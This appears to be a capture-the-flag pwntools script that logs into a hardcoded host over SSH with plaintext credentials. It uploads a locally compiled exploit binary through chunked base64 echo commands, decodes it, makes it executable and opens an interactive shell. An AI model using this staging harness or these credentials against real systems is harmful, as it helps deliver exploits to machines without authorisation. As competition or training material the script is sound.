#!/usr/bin/python
from pwn import *

HOST = "183.60.136.228"
PORT =  22

USER = "pwnvimu"
PW = "pwnvimu2002"

def compile():
    log.info("Compile")
    #os.system("musl-gcc -w -s -static -o3 pwn2.c -o pwn")

def exec_cmd(cmd):
    r.sendline(cmd)
    r.recvuntil("/ # ")

def upload():
    p = log.progress("Upload")

    with open("exp", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)
    
    r.recvuntil("/ # ")
    
    for i in range(0, len(encoded), 300):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+300]))
        
    exec_cmd("cat benc | base64 -d > bout")    
    exec_cmd("chmod +x bout")
    
    p.success()

def exploit(r):
    compile()
    upload()

    r.interactive()

    return

if __name__ == "__main__":
    session = ssh(USER, HOST, PORT, PW)
    r = session.run("/bin/sh")
    exploit(r)
